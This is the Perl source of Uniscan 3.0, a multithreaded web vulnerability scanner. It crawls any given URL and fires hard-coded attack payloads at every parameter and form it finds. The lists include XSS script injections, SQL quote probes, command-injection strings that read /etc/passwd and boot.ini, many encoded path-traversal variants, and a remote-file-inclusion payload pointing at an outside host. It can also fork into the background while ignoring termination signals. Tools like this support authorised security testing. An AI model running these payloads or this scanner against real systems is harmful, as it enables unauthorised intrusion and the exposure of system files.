#!/usr/bin/perl

#################################################
# Uniscan project				#
# visit: http://sourceforge.net/p/uniscan/	#
#        http://www.uniscan.com.br/		#
#################################################


use strict;
use Net::SSLeay qw(get_https post_https sslcat make_headers make_form);
use HTTP::Request;
use HTTP::Headers;
use LWP::UserAgent;
use threads;
use threads::shared;
use Thread::Queue;
use URI;
use Getopt::Std;

our $version;
our $timeout 	: shared;	# timeout 	=> time(in seconds)
our $variation 	: shared;	# variation 	=> maximum number of variations
our $max_size 	: shared;	# max_size 	=> maximum size in bytes of http request default: 1MB
our $max_threads: shared;	# max_threads 	=> maximum number of simultaneously active threads
our $max_reqs	: shared;	# max_reqs 	=> crawler maximum number of requests
our $try 	: shared;	#
our $cont 	: shared;	#
our $q 		: shared;	#
our $rfi_return	: shared;	# rfi_return => return of the base64 string of the hosted file for inclusion 
our $url 	: shared;	#
our $c		: shared;	#
our $extensions : shared;	# extensions => contains all the extensions that the scanner will ignore
our %files	: shared;	# hash with the found files
our %forms 	: shared;	# hash with the found forms
our @list 	: shared;	# arrray with the list of urls to try exploit
our %urls 	: shared;	# hash to check if a url has already been found (to avoid repetition)
our $u 		: shared;	#
our $p 		: shared;	#
our @xss	: shared;	#
our @rfi 	: shared;	#
our @sql	: shared;	#
our @lfi	: shared;	#
our @rce	: shared;	#
our $vulnerable : shared;	#
our $output	: shared;	# output file name
our $proxy	: shared;	# proxy host
our $proxy_port	: shared;	# proxy port
our @threads;
our %args;
our @url_list;
our $pid;


#############################
# DEFAULT CONFIGURATION
#############################

$version	= 3.0;
$variation	= 2;
$timeout	= 10;
$rfi_return 	= "unipampascanunipampa"; 
$extensions 	= ".exe.pdf.xls.csv.mdb.rpm.deb.doc.jpg.jpeg.png.gif.bmp.tgz.gz.bz2.zip.rar.tar.asf.avi.bin.dll.fla.mp3.mpg.mov.ogg.ppt.rtf.scr.wav.msi";
$max_threads 	= 15;
$max_reqs	= 15000;
$max_size 	= 1048576;
$output		= "Vuls.txt";


&banner();


getopts('u:f:T:v:t:r:s:ho:bp:l:', \%args);

# -h help
# -u url i.e: http[s]://www.example.org/
# -f file with list of url's list
# -T Maximun threads, default: 15
# -v Maximun variation number of a page, default: 2
# -t timeout of a connection in seconds, default: 10
# -r Maximun requests of the crawler, default: 15000
# -s Maximun size of one request in bytes, default: 108576 [1MB]
# -o output file, default: Vuls.txt
# -b uniscan go to background


if($args{h}){
	&help();
}

if(!$args{u} && !$args{f}){
	&help();
}

if($args{u}){
	&check($args{u});
	push(@url_list, $args{u});
}
elsif($args{f}){
	open(url_list, "<$args{f}") or die "$!\n";
	while(<url_list>){
		my $line = $_;
		chomp $line;
		&check($line);
		push(@url_list, $line);
	}
	close(url_list);
}
else{
    &help();
}

$max_threads 	= $args{T} if($args{T});
$variation 	= $args{v} if($args{v});
$timeout 	= $args{t} if($args{t});
$max_reqs 	= $args{r} if($args{r});
$max_size 	= $args{s} if($args{s});
$output 	= $args{o} if($args{o});
$proxy		= $args{p} if($args{p});
$proxy_port	= $args{l} if($args{l});

############################
# SHOW CONFIGURATION
############################
printf("Using:\nThreads:          [%d]\nVariations:       [%d]\nTimeout:          [%d]\nMax requests:     [%d]\nMax request size: [%d]\nURL's to scan:    [%d]\n\n", $max_threads, $variation, $timeout,$max_reqs,$max_size, scalar(@url_list));

if($args{b}){
	&background();
	printf("Going to background with pid: [%d]\n", $$);
}

############################
# Remote File Include test
############################
 
@rfi = (
	'http://www.uniscan.com.br/c.txt?'
	);


############################
# Cross-Site scripting tests
############################

@xss = (
	"<SCRIPT>alert('XSS')</SCRIPT>",
	"><SCRIPT>alert('XSS')</SCRIPT>",
	"\"><SCRIPT>alert('XSS')</SCRIPT>",
	"'><SCRIPT>alert('XSS')</SCRIPT>"
);


###########################
# SQL-injection tests
###########################

@sql = (
	"'",
	"\"",
	);


################################
# Remote Command Execution tests
################################

@rce = (
	'|cat%20/etc/passwd',
	'|cat%20/etc/passwd|',
	'|cat%20/etc/passwd%00|',
	'|cat%20/etc/passwd%00.html|',
	'|cat%20/etc/passwd%00.htm|',
	'|cat%20/etc/passwd%00.dat|',
	'system("cat%20/etc/passwd");',
	'.system("cat%20/etc/passwd").',
	':system("cat%20/etc/passwd");',
	';system("cat%20/etc/passwd").',
	';system("cat%20/etc/passwd")',
	';system("cat%20/etc/passwd");',
	':system("cat%20/etc/passwd").',
	'`cat%20/etc/passwd`',
	'`cat%20/etc/passwd`;',
	';cat%20/etc/passwd;',
	'|type%20c:\boot.ini',
	'|type%20c:\boot.ini|',
	'|type%20c:\boot.ini%00|',
	'|type%20c:\boot.ini%00.html|',
	'|type%20c:\boot.ini%00.htm|',
	'|type%20c:\boot.ini%00.dat|',
	'system("type%20c:\boot.ini");',
	'.system("type%20c:\boot.ini").',
	':system("type%20c:\boot.ini");',
	';system("type%20c:\boot.ini").',
	';system("type%20c:\boot.ini")',
	';system("type%20c:\boot.ini");',
	':system("type%20c:\boot.ini").',
	'`type%20c:\boot.ini`',
	'`type%20c:\boot.ini`;',
	';type%20c:\boot.ini;'
);


###########################
# Local File Include tests
###########################

@lfi = (
	'../../../../../../../../../../etc/passwd%00',
	'../../../../../../../../../../etc/passwd%00.jpg',
	'../../../../../../../../../../etc/passwd%00.html',
	'../../../../../../../../../../etc/passwd%00.css',
	'../../../../../../../../../../etc/passwd%00.php',
	'../../../../../../../../../../etc/passwd%00.txt',
	'../../../../../../../../../../etc/passwd%00.inc',
	'../../../../../../../../../../etc/passwd%00.png',
	'../../../../../../../../../../etc/passwd',
	'//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd',
	'//../../../../../../../../etc/passwd',
	'//../../../../../../../../etc/passwd%00',
	'//../../../../../../../../etc/passwd%00en',
	'//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd',
	'//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
	'//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
	'//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd',
	'//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
	'//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd',
	'//....................etc/passwd',
	'//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255..%255..%255cetc/passwd',
	'//%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd',
	'//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd',
	'//%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252e%252eetc/passwd',
	'../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
	'invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.',
	'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
	'/\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../\\../etc/passwd',
	'/../..//../..//../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd%00',
	'.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./.\\\\./etc/passwd',
	'../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd',
	'../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd',
	'..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.jpg',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.html',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.css',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.php',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.txt',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.inc',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini%00.png',
	'..\..\..\..\..\..\..\..\..\..\..\boot.ini',
	'c:\boot.ini',
	'c:\boot.ini%00'
	);

$| = 1;

foreach $url (@url_list){
&main();
}




################################
# 	SCANNER FUNCTIONS
################################




sub main(){
$vulnerable	= 0;
$c		= 0;
$p 		= 0;
$u		= 0;
@list 		= ();
%forms		= '';
$try		= 0;
$cont		= 0;
%files		= '';
%urls		= '';


printf("\nScanning $url\n");

# crawler start
$q = new Thread::Queue;
$q->enqueue($url);

threads->new(\&crawling, $q->dequeue);
@threads = threads->list;
$u++;

while($q->pending() || scalar(@threads)){
		@threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				if($p <= $max_reqs){
					$p++;
					printf("\rCrawling: %d% [%d - %d] Threads: %d \r", int(($p/$u)*100), $p, $u, scalar(threads->list));
					threads->new(\&crawling, $q->dequeue);
				}
				else{
					while($q->pending()){
						$q->dequeue;
					}
				}
                       } else {
                                foreach my $running (@threads) {
					$running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
                                        $running->join();
                                }
                        } 
                }

}
# crawler end
sleep(10);
printf("Crawling finished, %d URL's found!    \n", scalar(@list));

@list = &mix(@list); 		# include the strings to try explore possible vulnerability
@list = &remove(@list); 	# remove duplicate tests

printf("GET method tests: %d\n",scalar(@list));
printf("Starting GET method tests.\n");

$p =0;
$u = $#list;


# enqueue each element of url list
foreach my $teste (@list){
	$q->enqueue($teste); 
	$try++;
}

while ($q->pending() || scalar(@threads)) {
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                threads->new(\&check_vul_get, $q->dequeue);
                                $cont++;
                        } else {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
					$running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        } 
                }
        }

@threads = threads->list;
foreach my $running (@threads) {
	$running->join();
}


printf("GET method tests finished.        \n");
printf("starting POST method tests.\n");

$try = 0;
$cont = 0;

#test each found forms
foreach my $action (%forms)
{
	my $data = $forms{$action};
	foreach my $teste (@xss){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@sql){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@rfi){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@lfi){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

	foreach my $teste (@rce){
		my $temp = $data;
		$temp =~ s/123/$teste/g;
		$q->enqueue("$action#$temp"); 
		$try++;
	} 

}

while ($q->pending() || scalar(@threads)) { 
                @threads = threads->list;
                if ($q->pending > 0) {
                        if  (scalar(@threads) < $max_threads-1) {
				printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                threads->new(\&check_vul_post, $q->dequeue);
                                
				$cont++;
                        } else {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        }
                } else {
			@threads = threads->list;
                        if (scalar(@threads)) {
                                foreach my $running (@threads) {
					printf("\rThreads: %d [%d - %d] \r", scalar(threads->list), $cont, $try);
                                        $running->join();
                                }
                        } 
                }
        }

@threads = threads->list;
foreach my $running (@threads) {
	$running->join();
}

printf("POST method tests finished.    \n");
printf("Scanning finished. [%d] vulnerabilities found.\n", $vulnerable);
}


##############################################
#  Function crawling
#  Param: $url
#  Return: @array of urls found on this url
##############################################

sub crawling(){
	my $l = shift;
	my @tmp = &get_urls($l);

	foreach my $t (@tmp){
		if(!$urls{$t}){
			push(@list, $t);
			$q->enqueue($t);
			$u++;
			$urls{$t} = 1;
		}
	}

	printf("\rCrawling: %d% [$p - $u] Threads: %d \r", int(($p/$u)*100), scalar(threads->list));
}


##############################################
#  Function check_vul_get
#  This function check if a url have any 
#  vulnerability using method GET
#
#  Param: $url
#  Return nothing
##############################################

sub check_vul_get(){
	my $url1 = shift;
	my $res = &get_http($url1);

	#check LFI and RCE Vuls
	if($res =~/root:x:0:0:root/ && $url1 =~/\/etc\/passwd/){
		$vulnerable++;
		printf("[%d] [LFI] Vul: %s\n",$vulnerable, $url1) if($url1 =~/%2e|..\// && $url1 !~/cat%20\/etc\/passwd|'|"/);
		printf("[%d] [RCE] Vul: %s\n",$vulnerable, $url1) if($url1 =~/cat%20\/etc\/passwd/);
		&write($output, $url1);
	}
	
	if($res =~/boot loader/ && $res =~/operating systems/ && $res =~/WINDOWS/){
		$vulnerable++;
		printf("[%d] [LFI] vul: %s", $vulnerable, $url1) if($url1 !~/type%20/ && $url1 =~/boot.ini/);
		printf("[%d] [RCE] vul: %s", $vulnerable, $url1) if($url1 =~/type%20/ && $url1 =~/boot.ini/);
		&write($output, $url1);
	}
	#check FRI vuln
	if($res =~/$rfi_return/){
		$vulnerable++;
		printf("[%d] [RFI] Vul: %s\n",$vulnerable, $url1);
		&write($output, $url1);
	}

	#check SQL-i Vuln
	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $url1 =~/'|"/ && $url1 !~/etc\/passwd|<SCRIPT>|boot.ini/){
		$vulnerable++;
		printf("[%d] [SQL-i] Vul: %s\n",$vulnerable, $url1);
		&write($output, $url1);
	}

	#check XSS
	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $url1 =~/<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [XSS] Vul: %s\n\n",$vulnerable, $url1);
		&write($output, $url1);
	}
}



##############################################
#  Function check_vul_post
#  This function check if a form have any 
#  vulnerability using method POST
#
#  Param: $url of form, post data
#  Return nothing
##############################################

sub check_vul_post(){
	my ($action, $data)  = split('#', shift);
	my $res	   = &post_http($action, $data);
	if($res =~/root:x:0:0:root/){
		$vulnerable++;
		printf("[%d] [LFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/%2e|..\// && $data !~/cat%20\/etc\/passwd/);
		printf("[%d] [RCE] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data) if($data =~/cat%20\/etc\/passwd/);
		&write($output, ($action, "POST DATA: " .$data));
	}
	
	if($res =~/boot loader/ && $res =~/operating systems/ && $res =~/WINDOWS/){
		$vulnerable++;
		printf("[%d] [LFI] vul: %s\nData: %s", $vulnerable, $action, $data) if($data !~/type%20/ && $data =~/boot.ini/);
		printf("[%d] [RCE] vul: %s\nData: %s", $vulnerable, $action, $data) if($data =~/type%20/ && $data =~/boot.ini/);
		&write($output, ($action, "POST DATA: " .$data));
	 }

	if($res =~/$rfi_return/){
		$vulnerable++;
		printf("[%d] [RFI] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&write($output, ($action, "POST DATA: " .$data));
	}

	if(($res =~/You have an error in your SQL syntax/ || $res =~/Microsoft OLE DB Provider for ODBC Drivers error/ || $res =~/Supplied argument is not a valid .* result/ || $res =~/Unclosed quotation mark after the character string/) && $data =~/'|"/ && $data !~/etc\/passwd|<SCRIPT>|boot.ini/){
		$vulnerable++;
		printf("[%d] [SQL-i] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&write($output, ($action, "POST DATA: " .$data));
	}

	#check XSS
	if(($res =~/<SCRIPT>alert\('XSS'\)<\/SCRIPT>/) && $data =~/<SCRIPT>/){
		$vulnerable++;
		printf("[%d] [XSS] Vul: %s\nData: %s\n\n",$vulnerable, $action, $data);
		&write($output, ($action, "POST DATA: " .$data));
	}

}


##############################################
#  Function mix
#  This function generate a array with all 
#  tests with the scanner will perform
#
#  Param: @array of urls found on target
#  Return: @array with all tests
##############################################


sub mix(){
	my @list = @_;
	my @list2 = ();
	foreach my $line (@list){
		$line =~ s/&amp;/&/g;
		$line =~ s/\[\]//g;
		if($line =~ /=/){
			my $temp = $line;
			$temp = substr($temp,index($temp, '?')+1,length($temp));
			my @variables = split('&', $temp);
			for(my $x=0; $x< scalar(@variables); $x++){
				my $var_temp = substr($variables[$x],0,index($variables[$x], '=')+1);
				foreach my $str (@sql){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@rfi){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@lfi){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
				foreach my $str (@rce){
					$temp = $line;
					my $t = $var_temp . $str;
					$temp =~ s/$variables[$x]/$t/g;
					push(@list2, $temp);
				}
			}
		}
	}
	@list = ();
	return(@list2);
}


##############################################
#  Function add_form
#  when the crawler identifies a form, this 
#  function is called to add the form and the 
#  inputs in a hash to be tested after
#
#  Param: $url, $content of this url
#  Return: nothing
##############################################


sub add_form(){
	my $site = $_[0];
	my $content = $_[1];
	my @form = ();
	my $url2;
	my @inputs = &get_input($content);
	$content =~/<form.*action=\"(.*?)\".*>/i;
	$form[0] = $1;
	if(length($form[0]) <1){
		$form[0] = &get_file($site);
	}

	$content =~/<form.*method=\"(.*?)\".*>/i;
	$form[1] = $1;	

	if($form[1] =~/get/i){
		if($form[0] !~ /^https?:\/\//){
			
			if($form[0] =~/^\//){
			substr($form[0], 0, 1) = "";
			}
			$url2 = $url.$form[0].'?';
		}
		else{
			$url2 = $form[0] . '?';
		}
		foreach my $var (@inputs){
			$url2 .= '&'.$var .'=123';
		}
		
		my $fil = &get_file($url2);
		my $ext = &get_extension($fil);
		if($extensions !~/$ext/){
			$files{$fil}++;
			if($files{$fil} <= $variation){
				if($url2 =~/$url/){
					push(@list, $url2);
				}
			}
		}
	}
	else{
		if($form[0] !~ /https?:\/\//){
			$form[0] = $url.$form[0];
		}
		my $data;
		foreach my $var (@inputs){
			$data .='&'.$var.'=123';
		}
		if(!$forms{$form[0]}){
			$forms{$form[0]} = $data;
		}

	}
}


##############################################
#  Function get_input
#  this function identifies the inputs on the 
#  content of a page and stores it in an array
#
#  Param: $content of an page
#  Return: @array with all inputs found
##############################################


sub get_input(){
	my $content = shift;
	my @input = ();
	while ($content =~  m/<input.*name=\"(.+?)\".*>/gi){
		push(@input, $1);
	}
	while ($content =~  m/<input.*name=\'(.+?)\'.*>/gi){
		push(@input, $1);
	}
	return @input;
}


##############################################
#  Function get_http
#  this function do a GET request on target
#
#  Param: $url to GET
#  Return: $request content
##############################################


sub get_http(){
    	my $url1 = shift;
	if($url1 =~/^https/){
		if($proxy && $proxy_port){
			Net::SSLeay::set_proxy($proxy, $proxy_port);
		}
		substr($url1,0,8) = "";
		my $pos = index($url1, '/');
		my $url2 = substr($url1, 0, $pos);
		my $file = substr($url1, $pos, length($url1));
		my ($page) = get_https($url2, 443, $file);
		return $page;
}

	else{
    	my $req=HTTP::Request->new(GET=>$url1);
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://www.uniscan.com.br/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
	if($proxy && $proxy_port){
		print "proxy\n";
		$ua->proxy(['http'], 'http://'. $proxy . ':' . $proxy_port . '/');
	}

    	my $response=$ua->request($req);
    	return $response->content;
	}
}


##############################################
#  Function post_http
#  this function do a POST request on target
#
#  Param: $url to POST, $data to post
#  Return: $request content 
##############################################

sub post_http(){
	my $url1 = $_[0];
	my $data = $_[1];
	$data =~ s/\r//g;
	if($url1 =~/^https/){
		if($proxy && $proxy_port){
			Net::SSLeay::set_proxy($proxy, $proxy_port);
		}
		substr($url1,0,8) = "";
		my $pos = index($url1, '/');
		my $url2 = substr($url1, 0, $pos);
		my $file = substr($url1, $pos, length($url1));
		my ($page, $response, %reply_headers) = post_https($url2, 443, $file, '', $data);
		return $page;
	}

	else{
    	my $headers = HTTP::Headers->new();
    	my $request= HTTP::Request->new("POST", $url1, $headers);
    	$request->content($data);
    	$request->content_type('application/x-www-form-urlencoded');
    	my $ua=LWP::UserAgent->new(agent => "Uniscan/". $version . " http://www.uniscan.com.br/");
    	$ua->timeout($timeout);
	$ua->max_size($max_size);
	if($proxy && $proxy_port){
		$ua->proxy(['http'], 'http://'. $proxy . ':' . $proxy_port . '/');
	}
	my $response=$ua->request($request);
	return $response->content;
	}
}


##############################################
#  Function get_urls
#  this function identify links on a page
#
#  Param: $url to search links
#  Return: @array with links found
##############################################

sub get_urls()
{
    	my $base = shift;
    	my @lst = ();
	my @ERs = (	"href=\"(.+)\"", 
			"href='(.+)'", 
			"location.href='(.+)'",
			"src='(.+)'",
			"src=\"(.+)\"",
			"location.href=\"(.+)\"", 
			"<meta.*content=\"?.*;URL=(.+)\"?.*?>"
		);
				
    	my $result = &get_http($base);
	if($result =~ /<form/i){
		&add_form($base, $result);
	}
    	if($result){
		chomp($result);
		foreach my $er (@ERs){
			while ($result =~  m/$er/gi)
			{
				my $link = $1;
				if ($link =~/"/){
					$link = substr($link,0,index($link, '"'));
				}
				if ($link =~/'/){
					$link = substr($link,0,index($link, "'"));
				}
				
				if($link !~/^https?:\/\// && $link !~/https?:\/\// && $link !~/:/){
					if($link =~/^\//){
						substr($link,0,1) = "";
					}
					$link = $url . $link;
				}
				chomp $link;
				$link =~s/&amp;/&/g;
		 
				if($link =~/^https?:\/\// && $link =~/^$url/ && $link !~/#|javascript:|mailto:/){
					my $fil = &get_file($link);
					my $ext = &get_extension($fil);
					if($extensions !~/$ext/){
						$files{$fil}++;
						if($files{$fil} <= $variation){
							push (@lst,$link);
						}
					}
				}
			}
		}
	}
	return @lst;
}


##############################################
#  Function banner
#  this function show the scanner banner
#
#  Param: nothing
#  Return: nothing
##############################################


sub banner(){
	printf("###############################\n# Uniscan project             #\n# http://www.uniscan.com.br/  #\n###############################\nV. %.1f\n\n", $version);
}


##############################################
#  Function host
#  this function return the domain of a url
#
#  Param: a $url
#  Return: $domain of url
##############################################

sub host(){
  	my $h = shift;
  	my $url1 = URI->new( $h || return -1 );
  	return $url1->host();
}


##############################################
#  Function host
#  this function return the path and file of 
#  a page
#
#  Param: $url
#  Return: $path/file 
##############################################

sub get_file(){
	my $url1 = shift;
	substr($url1,0,7) = "" if($url1 =~/http:\/\//);
	substr($url1,0,8) = "" if($url1 =~/https:\/\//);
	$url1 = substr($url1, index($url1, '/'), length($url1));
	if($url1 =~/\?/){
		$url1 = substr($url1, 0, index($url1, '?'));
	}
	return $url1;
}


##############################################
#  Function write
#  this function write a text in a file
#
#  Param: $file_name, @content
#  Return: nothing
##############################################


sub write(){
	my ($filtxt, @content) = @_;
	open(my $a, ">>$filtxt") or die "$!\n";
	foreach(@content){
		print $a "$_\n";
	}
	close($a);
}


##############################################
#  Function get_extension
#  this function return the extension of a file
#
#  Param: $path/to/file
#  Return: $extension of file
##############################################

sub get_extension(){
	my $file = shift;
	if($file =~/\./){
		my $ext = substr($file, rindex($file, '.'), length($file));
		$ext =~ s/ //g;
		if($ext !~/\(|\)|\-|\//){
			return $ext;
		}
		else {
			return 0;
		}
	}
	else{
		return 0;
	}
}


##############################################
#  Function remove
#  this function removes repeated elements of 
#  a array
#
#  Param: @array
#  Return: @array
##############################################

sub remove{
   	my @si = @_;
   	my @novo = ();
   	my %ss;
   	foreach my $s (@si)
   	{
        	if (!$ss{$s})
        	{
            		push(@novo, $s);
            		$ss {$s} = 1;
        	}
    	}
    	return (@novo);
}


##############################################
# Function help
# this function show the help
#
#
# Param: nothing
# Return: nothing
##############################################


sub help{
	print 	"-h help\n".
		"-u <url> example: https://www.example.com/\n".
		"-f <file> with list of url's\n".
		"-T <Maximun threads> default: 15\n".
		"-v <Maximun variation> number of a page, default: 2\n".
		"-t <timeout> of a connection in seconds, default: 10\n".
		"-r <Maximun requests> of the crawler, default: 15000\n".
		"-s <Maximun size> of one request in bytes, default: 1048576 [1MB]\n".
		"-o <output file> default: Vuls.txt\n".
		"-b Uniscan go to background\n".
		"-p <proxy host> example: www.example.com\n".
		"-l <proxy port> example: 8080\n".
		"Option -u or -f is required, all others no.\n".
		"\n".
		"usage: \n".
		"[1] perl $0 -u http://www.example.com/\n".
		"[2] perl $0 -f /home/user/file.txt\n".
		"[3] perl $0 -u https://www.example.com/\n".
		"[4] perl $0 -u http://www.example.com/ -T 30 -t 20 -r 1000 -s 524288 -o vulnerables.txt\n".
		"[5] perl $0 -f /home/user/file.txt -T 30 -t 20 -r 1000 -s 524288 -o vulnerables.txt -b\n".
		"[6] perl $0 -u https://www.example.com/ -T 20 -t 20 -r 200 -b -p 192.168.1.5 -l 8001\n\n\n";
	exit();
}


##############################################
# Function check
# this function check if one url is in correct
# format
#
# Param: $url
# Return: nothing
##############################################

sub check{
	my $url1 = shift;
	if(!$url1 || $url1 !~ /https?:\/\/.+\//){
		printf("The url %s is not in correct format\n", $url1);
		exit();
	}
}


##############################################
# Function background
# This function put Uniscan to background mode
#
#
# Param: nothing
# Return: nothing
##############################################

sub background{
	$SIG{"INT"} = "IGNORE";
	$SIG{"HUP"} = "IGNORE";
	$SIG{"TERM"} = "IGNORE";
	$SIG{"CHLD"} = "IGNORE";
	$SIG{"PS"} = "IGNORE";
	$pid = fork;
	exit if $pid;
	die "Fork problem: $!\n" unless defined($pid);
}
